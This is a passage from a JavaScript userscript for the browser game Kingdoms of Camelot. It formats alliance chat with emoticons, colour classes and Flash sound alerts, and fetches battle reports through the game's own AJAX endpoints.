	 msg = msg.replace (/\bhttps\:\/\/[-a-z].*jpg/i, 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABkAAAAZCAYAAAGz7rX1AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyBpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOkM2OTFCNUFEMUFGQTExRTFCMzcwODQxODhDNDc3NDgzIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOkM2OTFCNUFFMUFGQTExRTFCMzcwODQxODhDNDc3NDgzIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6QzY5MUI1QUIxQUZBMTFFMUIzNzA4NDE4OEM0Nzc0ODMiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6QzY5MUI1QUMxQUZBMTFFMUIzNzA4NDE4OEM0Nzc0ODMiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz5bQ4Y+AAAA+UlEQVR42mL8//8/AwoACYiIioHwfxCbiQENMKJrAQggFAEWUTFxsDEgCSacygACCMMQZMACIqDmwMwCa3r96iUDXp0AAYRTkgmnXUB7wG5FE//PhEWQAcNTlFkOEEB4/UJs6GCEEhIbHmrYnIDN24zIYiw4TMcLyPITEwMZACCASLaJiebOYgTlGgKhBHczMF4YWbAlPTQxRmxO+o9LAbpNTLisx+Z8ZA2MxMY4E5GmD+aII1kDQICRlczpki0GpSWwQouYzMGIIx/g0vsflJHQU+5/Iiwg3ydoFpFj4H9iS15sFhFrKSO5EU9xMOGzhJGaFoxmRpIBAJ0rWjxTwt+WAAAAAElFTkSuQmCC');
	}
	// if (pdxTeamAvatars.indexOf(suid) >= 0) {
	 // msg = msg.replace (/\bhttps\:\/\/[-a-z].*jpg/i, 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABkAAAAZCAYAAAGz7rX1AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyBpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOkM2OTFCNUFEMUFGQTExRTFCMzcwODQxODhDNDc3NDgzIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOkM2OTFCNUFFMUFGQTExRTFCMzcwODQxODhDNDc3NDgzIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6QzY5MUI1QUIxQUZBMTFFMUIzNzA4NDE4OEM0Nzc0ODMiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6QzY5MUI1QUMxQUZBMTFFMUIzNzA4NDE4OEM0Nzc0ODMiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz5bQ4Y+AAAA+UlEQVR42mL8//8/AwoACYiIioHwfxCbiQENMKJrAQggFAEWUTFxsDEgCSacygACCMMQZMACIqDmwMwCa3r96iUDXp0AAYRTkgmnXUB7wG5FE//PhEWQAcNTlFkOEEB4/UJs6GCEEhIbHmrYnIDN24zIYiw4TMcLyPITEwMZACCASLaJiebOYgTlGgKhBHczMF4YWbAlPTQxRmxO+o9LAbpNTLisx+Z8ZA2MxMY4E5GmD+aII1kDQICRlczpki0GpSWwQouYzMGIIx/g0vsflJHQU+5/Iiwg3ydoFpFj4H9iS15sFhFrKSO5EU9xMOGzhJGaFoxmRpIBAJ0rWjxTwt+WAAAAAElFTkSuQmCC');
	// }
	
    if (suid==unsafeWindow.tvuid && Options.UserAvatar)
		msg = msg.replace (/\bhttps\:\/\/[-a-z].*jpg/i, Options.UserAvatarURL );
		
		
	// TOWER ALERT
	if (m[0].indexOf(''+culang.pTcemb+'') >= 0 && Options.chatAttack)
     	element_class = 'ptChatAttack';	
	
	if (m[0].indexOf(''+culang.pTcemb+'') >= 0 && Options.enableTowerAlert) {
	   msg +='<span id"towersound"><object type="application/x-shockwave-flash" data="http://koc.god-like.info/pdxminiplayer.swf" width="160" height="20" id="dewplayer" name="dewplayer"><param name="wmode" value="transparent" /><param name="movie" value="http://koc.god-like.info/pdxminiplayer.swf" /><param name="flashvars" value="mp3='+ Options.URLson2 +'&amp;autostart=1&amp;showtime=1&amp;volume='+ Options.URLson2vol +'" /></object></span>';
	 }
	// ON EMBASSY TOWER ALERT FROM KOC ALLIANCE - EXTRA
	if (m[0].indexOf(''+culang.embtroops+'') >= 0 && Options.chatAttack)
     	element_class = 'ptChatAttack';
	if (m[0].indexOf(''+culang.embtroops+'') >= 0 && Options.enableTowerAlert) {
	   msg +='<span id"towersoundae"><object type="application/x-shockwave-flash" data="http://koc.god-like.info/pdxminiplayer.swf" width="160" height="20" id="dewplayer" name="dewplayer"><param name="wmode" value="transparent" /><param name="movie" value="http://koc.god-like.info/pdxminiplayer.swf" /><param name="flashvars" value="mp3='+ Options.URLson2 +'&amp;autostart=1&amp;showtime=1&amp;volume='+ Options.URLson2vol +'" /></object></span>';
	 }
	 // ON WILD ATTACK
	 if (m[0].indexOf(''+culang.pTcmywild+'') >= 0 && Options.chatWildAttack)
       	element_class = 'ptWildAttack';
	 if (m[0].indexOf(''+culang.pTcmywild+'') >= 0 && Options.enableTowerAlertWild) {
       	msg +='<span id"wildsound"><object type="application/x-shockwave-flash" data="http://koc.god-like.info/pdxminiplayer.swf" width="160" height="20" id="dewplayer" name="dewplayer"><param name="wmode" value="transparent" /><param name="movie" value="http://koc.god-like.info/pdxminiplayer.swf" /><param name="flashvars" value="mp3='+ Options.URLson4 +'&amp;autostart=1&amp;showtime=1&amp;volume='+ Options.URLson4vol +'" /></object></span>';
       }	
	  // ON LOW FOOD
	  if (m[0].indexOf(''+culang.lowfoodr+'') >= 0 && Options.enableFoodChatAlertBG)
	    element_class = 'ptChatLowFood';
	  if (m[0].indexOf(''+culang.lowfoodr+'') >= 0 && Options.enableFoodChatAlert) {
       	msg +='<span id"lowfoodsound"><object type="application/x-shockwave-flash" data="http://koc.god-like.info/pdxminiplayer.swf" width="160" height="20" id="dewplayer" name="dewplayer"><param name="wmode" value="transparent" /><param name="movie" value="http://koc.god-like.info/pdxminiplayer.swf" /><param name="flashvars" value="mp3='+ Options.URLson3 +'&amp;autostart=1&amp;showtime=1&amp;volume='+ Options.URLson3vol +'" /></object></span>';
       }
	 	 // FUN ALERTS
       if (m[0].indexOf(''+culang.OSAattackfetch+'') >= 0 && Options.OSAattack) {
       	msg +='<span id"funsoundattack"><object type="application/x-shockwave-flash" data="http://koc.god-like.info/pdxminiplayer.swf" width="160" height="20" id="dewplayer" name="dewplayer"><param name="wmode" value="transparent" /><param name="movie" value="http://koc.god-like.info/pdxminiplayer.swf" /><param name="flashvars" value="mp3='+ Options.URLson5 +'&amp;autostart=1&amp;showtime=1&amp;volume='+ Options.URLson5vol +'" /></object></span>';
       }
	   // -horn-
       if (m[0].indexOf(''+culang.OSAhornfetch+'') >= 0 && Options.OSAhorn) {
       	msg +='<span id"funsoundhorn">\
	   <object type="application/x-shockwave-flash" data="http://koc.god-like.info/pdxminiplayer.swf" width="160" height="20" id="dewplayer" name="dewplayer"><param name="wmode" value="transparent" /><param name="movie" value="http://koc.god-like.info/pdxminiplayer.swf" /><param name="flashvars" value="mp3='+ Options.URLson6 +'&amp;autostart=1&amp;showtime=1&amp;volume='+ Options.URLson6vol +'" /></object></span>';
       }
	   // -gun-
       if (m[0].indexOf(''+culang.OSAgunfetch+'') >= 0 && Options.OSAgun) {
	   	   element_class = 'pdxFunSoundGun'; 
			   msg += '<div id"funsoundgun"><object type="application/x-shockwave-flash" data="http://koc.god-like.info/pdxminiplayer.swf" width="160" height="20" id="dewplayer" name="dewplayer"><param name="wmode" value="transparent" /><param name="movie" value="http://koc.god-like.info/pdxminiplayer.swf" /><param name="flashvars" value="mp3='+ Options.URLson7 +'&amp;autostart=1&amp;showtime=1&amp;volume='+ Options.URLson7vol +'" /></object></div>';
	   }
	
	if (m[0].indexOf(Options.userNameSou1) >= 0 && Options.enableUsr1Sound && Options.enableNickColor==false) {
	msg += '<div id"sonUsr1"><object type="application/x-shockwave-flash" data="http://koc.god-like.info/pdxminiplayer.swf" width="160" height="20" id="dewplayer" name="dewplayer"><param name="wmode" value="transparent" /><param name="movie" value="http://koc.god-like.info/pdxminiplayer.swf" /><param name="flashvars" value="mp3='+ Options.URLsonUsr1 +'&amp;autostart=1&amp;showtime=1&amp;volume='+ Options.URLsonUsr1vol +'" /></object></div>';
	} 
	if (m[0].indexOf(Options.userNameSou1) >= 0 && Options.enableNickColor && Options.enableUsr1Sound==false) {
	element_class = 'ptChatUser1Sou';
	}
	if (m[0].indexOf(Options.userNameSou1) >= 0 && Options.enableUsr1Sound && Options.enableNickColor==true) {
	msg += '<div id"sonUsr1"><object type="application/x-shockwave-flash" data="http://koc.god-like.info/pdxminiplayer.swf" width="160" height="20" id="dewplayer" name="dewplayer"><param name="wmode" value="transparent" /><param name="movie" value="http://koc.god-like.info/pdxminiplayer.swf" /><param name="flashvars" value="mp3='+ Options.URLsonUsr1 +'&amp;autostart=1&amp;showtime=1&amp;volume='+ Options.URLsonUsr1vol +'" /></object></div>';
	element_class = 'ptChatUser1Sou';
	}
	
	
	if (m[0].indexOf(Options.userName1) >= 0 && Options.enableUserName1) { element_class = 'ptChatUser1'; }
    if (m[0].indexOf(Options.userName2) >= 0 && Options.enableUserName2) { element_class = 'ptChatUser2'; }
    if (m[0].indexOf(Options.userName3) >= 0 && Options.enableUserName3) { element_class = 'ptChatUser3'; }			
	if (m[0].indexOf(Options.userName4) >= 0 && Options.enableUserName4) { element_class = 'ptChatUser4'; }
    if (m[0].indexOf(Options.userName5) >= 0 && Options.enableUserName5) { element_class = 'ptChatUser5'; }
    if (m[0].indexOf(Options.userName6) >= 0 && Options.enableUserName6) { element_class = 'ptChatUser6'; }	 		
	if (m[0].indexOf(Options.userName7) >= 0 && Options.enableUserName7) { element_class = 'ptChatUser7'; }
    if (m[0].indexOf(Options.userName8) >= 0 && Options.enableUserName8) { element_class = 'ptChatUser8'; }
    if (m[0].indexOf(Options.userName9) >= 0 && Options.enableUserName9) { element_class = 'ptChatUser9'; }
	if (m[0].indexOf(Options.userName10) >= 0 && Options.enableUserName10) { element_class = 'ptChatUser10'; }
	if (m[0].indexOf(Options.userName11) >= 0 && Options.enableUserName11) { element_class = 'ptChatUser11'; }
    if (m[0].indexOf(Options.userName12) >= 0 && Options.enableUserName12) { element_class = 'ptChatUser12'; }
    if (m[0].indexOf(Options.userName13) >= 0 && Options.enableUserName13) { element_class = 'ptChatUser13'; }			
	if (m[0].indexOf(Options.userName14) >= 0 && Options.enableUserName14) { element_class = 'ptChatUser14'; }
    if (m[0].indexOf(Options.userName15) >= 0 && Options.enableUserName15) { element_class = 'ptChatUser15'; }
    if (m[0].indexOf(Options.userName16) >= 0 && Options.enableUserName16) { element_class = 'ptChatUser16'; }	 		
	if (m[0].indexOf(Options.userName17) >= 0 && Options.enableUserName17) { element_class = 'ptChatUser17'; }
    if (m[0].indexOf(Options.userName18) >= 0 && Options.enableUserName18) { element_class = 'ptChatUser18'; }
    if (m[0].indexOf(Options.userName19) >= 0 && Options.enableUserName19) { element_class = 'ptChatUser19'; }
	if (m[0].indexOf(Options.userName20) >= 0 && Options.enableUserName20) { element_class = 'ptChatUser20'; }	
	if (m[0].indexOf(Options.userName21) >= 0 && Options.enableUserName21) { element_class = 'ptChatUser21'; }
	if (m[0].indexOf(Options.userName21) >= 0 && Options.enableUserName21) { element_class = 'ptChatUser21'; }
    if (m[0].indexOf(Options.userName22) >= 0 && Options.enableUserName22) { element_class = 'ptChatUser22'; }
    if (m[0].indexOf(Options.userName23) >= 0 && Options.enableUserName23) { element_class = 'ptChatUser23'; }			
	if (m[0].indexOf(Options.userName24) >= 0 && Options.enableUserName24) { element_class = 'ptChatUser24'; }
    if (m[0].indexOf(Options.userName25) >= 0 && Options.enableUserName25) { element_class = 'ptChatUser25'; }
    if (m[0].indexOf(Options.userName26) >= 0 && Options.enableUserName26) { element_class = 'ptChatUser26'; }	 		
	if (m[0].indexOf(Options.userName27) >= 0 && Options.enableUserName27) { element_class = 'ptChatUser27'; }
    if (m[0].indexOf(Options.userName28) >= 0 && Options.enableUserName28) { element_class = 'ptChatUser28'; }
    if (m[0].indexOf(Options.userName29) >= 0 && Options.enableUserName29) { element_class = 'ptChatUser29'; }
	if (m[0].indexOf(Options.userName30) >= 0 && Options.enableUserName30) { element_class = 'ptChatUser30'; }
	
	msg = msg.replace ("class='content'", "class='content "+ element_class +"'");
	
	if (msg.indexOf('claimAllianceChat')<0){
      msg = msg.replace (/([0-9]{1,3})\s*(,|-)\s*([0-9]{1,3})/img, '$1,$3');
    }
	msg = msg.replace (/(\bReport No\:\s([0-9]+))/g, '<a onclick=\'ptChatReportClicked($2,0)\'>$1</a>');
    msg = msg.replace (/(\bBericht\:\s([0-9]+))/g, '<a onclick=\'ptChatReportClicked($2,0)\'>$1</a>');
     var m = /(Lord|Lady) (.*?)</im.exec(msg);
     if (m != null)
       m[2] = m[2].replace(/\'/g,""+culang.chatstuff+"");
    // m[1] = m[1].replace(/\'/a,"??");
	 msg = msg.replace (/<img (.*?>)/img, '<img class=\"ptChatIcon\" $1');
    if (Options.Smiley) {
	msg = msg.replace(':-)', '<img height=50% width=50% class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00100-smile.gif\">');		msg = msg.replace(':)', '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00100-smile.gif\">');		msg = msg.replace(':=)', '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00100-smile.gif\">');		msg = msg.replace('^^', '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00100-smile.gif\">');
	msg = msg.replace(':=(', '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00101-sadsmile.gif\">');		msg = msg.replace(':-(', '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00101-sadsmile.gif\">');
	msg = msg.replace(':D', '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00102-bigsmile.gif\">');	msg = msg.replace(':-D', '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00102-bigsmile.gif\">');		msg = msg.replace(':=D', '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00102-bigsmile.gif\">'); 
	msg = msg.replace(';-(', '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00106-crying.gif\">');		msg = msg.replace(';=(', '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00106-crying.gif\">'); 	
	msg = msg.replace(';-)', '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00105-wink.gif\">');		msg = msg.replace(';=)', '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00105-wink.gif\">');	
	msg = msg.replace(':-*', '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00109-kiss.gif\">');		msg = msg.replace(':=*', '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00109-kiss.gif\">');	
	msg = msg.replace(':^)', '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00112-wondering.gif\">');	
	msg = msg.replace('<3', '<img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/heart.png\">');
	msg = msg.replace("I=)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00113-sleepy.gif\">');	msg = msg.replace("I-)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00113-sleepy.gif\">');		msg = msg.replace("|-)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00113-sleepy.gif\">');	
	msg = msg.replace("8-)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00103-cool.gif\">');		msg = msg.replace("8=)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00103-cool.gif\">');		msg = msg.replace("B-)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00103-cool.gif\">');		msg = msg.replace("B=)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00103-cool.gif\">'); 	
	msg = msg.replace("(ci)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00176-smoke.gif\">');		msg = msg.replace("(smoke)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00176-smoke.gif\">');    msg = msg.replace("(rauchen)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00176-smoke.gif\">');	msg = msg.replace("(smoking)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00176-smoke.gif\">');	
	msg = msg.replace("(fubar)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00181-fubar.gif\">');	
	msg = msg.replace(":-&", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00119-puke.gif\">');		msg = msg.replace(":=&", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00119-puke.gif\">');	
	msg = msg.replace(">:)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00116-evilgrin.gif\">');		msg = msg.replace("]:)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00116-evilgrin.gif\">');	
	msg = msg.replace("(:|", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00107-sweating.gif\">');	
	msg = msg.replace('(glory)', '<img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/glory.png\">');
	msg = msg.replace('(fight)', '<img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/glory.png\">');
	msg = msg.replace(":P", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00110-tongueout.gif\">'); 	msg = msg.replace(":=P", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00110-tongueout.gif\">'); 	msg = msg.replace(":P", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00110-tongueout.gif\">');	msg = msg.replace(":-P", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00110-tongueout.gif\">');		msg = msg.replace(":=p", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00110-tongueout.gif\">');	
	msg = msg.replace(":-$", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00111-blush.gif\">');		msg = msg.replace(":=$", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00111-blush.gif\">');		msg = msg.replace(':">', '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00111-blush.gif\">');	
	msg = msg.replace("(party)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00123-party.gif\">');		msg = msg.replace("(like)", '<img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/like.gif\">');	msg = msg.replace("(dontlike)", '<img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/dontlike.gif\">');	
	msg = msg.replace("(bug)", '<img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/bug.gif\">');	msg = msg.replace("(pool)", '<img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/poolparty.gif\">');		msg = msg.replace("(bandit)", '<img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/skype_bandit.gif\">');		msg = msg.replace("(drunk)", '<img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/skype_drunk.gif\">');		msg = msg.replace("(finger)", '<img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/skype_finger.gif\">');		msg = msg.replace("(headbang)", '<img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/skype_headbang.gif\">');		msg = msg.replace("(mooning)", '<img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/skype_mooning.gif\">');		msg = msg.replace("(rock)", '<img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/skype_rock.gif\">');		msg = msg.replace("(swear)", '<img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/swear.gif\">');	msg = msg.replace("(tmi)", '<img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/tmi.gif\">');		msg = msg.replace("(toivo)", '<img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/skype_toivo.gif\">');		msg = msg.replace("(bow)", '<img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/skype-wackyb-0139-1-bow.gif\">');   	msg = msg.replace("(ninja)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00170-ninja.gif\">');		msg = msg.replace("(beer)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00167-beer.gif\">');		msg = msg.replace("(drink)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00168-drink.gif\">');		msg = msg.replace("(muscle)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00165-muscle.gif\">');	msg = msg.replace("(cafe)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00162-coffee.gif\">');	msg = msg.replace("(kaffee)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00162-coffee.gif\">');	msg = msg.replace("(coffee)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00162-coffee.gif\">');	msg = msg.replace("(pizza)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00163-pizza.gif\">');		msg = msg.replace("(music)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00159-music.gif\">');		msg = msg.replace("(inlove)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00115-inlove.gif\">');	
	msg = msg.replace("x=(", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00121-angry.gif\">');			msg = msg.replace("x-(", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00121-angry.gif\">');	msg = msg.replace(":-@", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00121-angry.gif\">');			msg = msg.replace(":=@", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00121-angry.gif\">');	
	msg = msg.replace("(clap)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00137-clapping.gif\">');	msg = msg.replace("(bravo)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00137-clapping.gif\">');	msg = msg.replace("(klatschen)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00137-clapping.gif\">');
	msg = msg.replace("(punch)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00146-punch.gif\">');		msg = msg.replace("(yes)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00148-yes.gif\">');		msg = msg.replace("(handshake)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00150-handshake.gif\">');		msg = msg.replace("(no)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00149-no.gif\">');	msg = msg.replace("(rofl)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00140-rofl.gif\">');		msg = msg.replace("(flower)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00155-flower.gif\">');		msg = msg.replace("(phone)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00161-phone.gif\">');
	msg = msg.replace("(pdx)", '<img class=emoicon src=\"http://koc.god-like.info/pdx.gif\">');	msg = msg.replace("(ksx)", '<img class=emoicon src=\"http://koc.god-like.info/pdx.gif\">');			msg = msg.replace("(nessaja)", '<img class=emoicon src=\"http://koc.god-like.info/pdx.gif\">');			msg = msg.replace("(jontey)", '<img class=emoicon src=\"http://koc.god-like.info/pdx.gif\">');
	}  
	   if (whisp.indexOf(''+culang.whispertou+'') >= 0 && Options.WhisperOn) {
       if (whisp.indexOf(''+culang.saytoalli+'') < 0) 
	   msg +='<span id"whispersound"><object type="application/x-shockwave-flash" data="http://koc.god-like.info/pdxminiplayer.swf" width="160" height="20" id="dewplayer" name="dewplayer"><param name="wmode" value="transparent" /><param name="movie" value="http://koc.god-like.info/pdxminiplayer.swf" /><param name="flashvars" value="mp3='+ Options.URLson1 +'&amp;autostart=1&amp;showtime=1&amp;volume='+ Options.URLson1vol +'" /></object></span>';
       }
	   

	
       return msg;
   },
}
/**********************************************************************************/
/************ KOC POWER - REPORT HOTLINK *****************************************/
/********************************************************************************/
var Rpt = {
FindReport : function(rpId, pageNum) {
		var t = Rpt; 
		var fixrpId = '0r' + rpId;
		var params = uW.Object.clone(uW.g_ajaxparams);
			params.pf=0;
			params.group="a";
			params.pageNo = pageNum;
			new MyAjaxRequest(uW.g_ajaxpath + "ajax/listReports.php" + uW.g_ajaxsuffix, {
				method: "post",
				parameters: params,
				onSuccess: function (rslt) {
					if (rslt.ok) {
						if(parseInt(pageNum) >= parseInt(rslt['totalPages'])) { 
							alert(''+culang.norptfound+'!'); 
						};
						
						if(rslt.arReports[fixrpId]) {
							// Attacker
							var rpt = rslt.arReports[fixrpId];
							rpt.side1Name = rslt.arPlayerNames['p'+rpt.side1PlayerId];
							if (rpt.side1AllianceId > 0)
								rpt.side1AllianceName = rslt.arAllianceNames['a'+rpt.side1AllianceId];
							else
								rpt.side1AllianceName = ''+culang.noally+'';
							if (rpt.side1CityId > 0)
								rpt.side1CityName = rslt.arCityNames['c'+rpt.side1CityId];
							else
								rpt.side1CityName = 'none';
							// Target
							if (parseInt(rpt.side0PlayerId) == 0) { // Kabam
								rpt.side0Name = ''+culang.rptvic+'';
								rpt.side0AllianceName = '';
								rpt.side0CityName = '';
							} else { // Player
								rpt.side0Name = rslt.arPlayerNames['p'+rpt.side0PlayerId];
								if (rpt.side0AllianceId > 0)
									rpt.side0AllianceName = rslt.arAllianceNames['a'+rpt.side0AllianceId];
								else
									rpt.side0AllianceName = ''+culang.noally+'';
								if (rpt.side0CityId > 0)
									rpt.side0CityName = rslt.arCityNames['c'+rpt.side0CityId];
								else
									rpt.side0CityName = 'none';
							}
							t.GetReport(rpId, rpt);
						} else {
							pageNum = parseInt(pageNum+1);
							t.FindReport(rpId, pageNum);
						};
					}
				},
				onFailure: function () {
					alert('Kabam hat mal wieder Fehler');
				},
			}, false);
	},

	GetReport: function(rpId, rpt){
		var t = Rpt;
		var params = uW.Object.clone(uW.g_ajaxparams);
		if (parseInt(rpt.side1AllianceId) == parseInt(Seed.allianceDiplomacies.allianceId)) {
			params.side = 1;
		} else {
			params.side = 0;
		}
		
		params.rid=rpId;
			new MyAjaxRequest(uW.g_ajaxpath + "ajax/fetchReport.php" + uW.g_ajaxsuffix, {
				method: "post",
				parameters: params,
				onSuccess: function (rslt) {
					if(rslt.error_code)
					alert(''+culang.foundcantread+'');
					else
					t.ReportPopup(rslt, rpt, rpId);
				},
